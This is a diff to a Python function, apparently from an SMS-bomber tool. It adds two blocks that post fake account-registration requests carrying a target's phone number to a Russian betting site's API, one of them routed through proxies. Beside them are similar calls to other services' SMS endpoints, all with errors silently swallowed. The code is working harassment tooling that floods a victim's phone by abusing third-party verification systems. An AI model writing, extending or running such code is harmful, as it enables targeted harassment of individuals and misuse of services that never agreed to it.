@@ -124,6 +124,27 @@ def sms(prx, number, tm, code):
 
 				try:
 					payload = {
+						"fio":"",
+						"password":"2342uirejhwfr",
+						"email":"",
+						"emailAdvertAccepted":True,
+						"phoneNumber":"+"+number,
+						"webReferrer":"https://www.fonbet.ru/",
+						"advertInfo":"",
+						"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"promoId":"",
+						"ecupis":True,
+						"birthday":"2000-12-12",
+						"sysId":1,
+						"lang":"ru",
+						"deviceId":"B9B569D495FE1E6193DC98560A1E2A47"
+					}
+					requests.post(" https://clientsapi510.bkfon-resources.com/cps/superRegistration/createProcess", json=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
+					payload = {
 						"CountryCodeNumber": "+" + number[1:], 
 						"IsoCountryCode": "RU", 
 						"PhoneNumber": f"+{number}"
@@ -386,6 +407,27 @@ def sms(prx, number, tm, code):
 						"phone": number
 					}
 					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
+				except:
+					pass
+
+				try:
+					payload = {
+						"fio":"",
+						"password":"2342uirejhwfr",
+						"email":"",
+						"emailAdvertAccepted":True,
+						"phoneNumber":"+"+number,
+						"webReferrer":"https://www.fonbet.ru/",
+						"advertInfo":"",
+						"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"promoId":"",
+						"ecupis":True,
+						"birthday":"2000-12-12",
+						"sysId":1,
+						"lang":"ru",
+						"deviceId":"B9B569D495FE1E6193DC98560A1E2A47"
+					}
+					requests.post(" https://clientsapi510.bkfon-resources.com/cps/superRegistration/createProcess", json=payload)
 				except:
 					pass
 
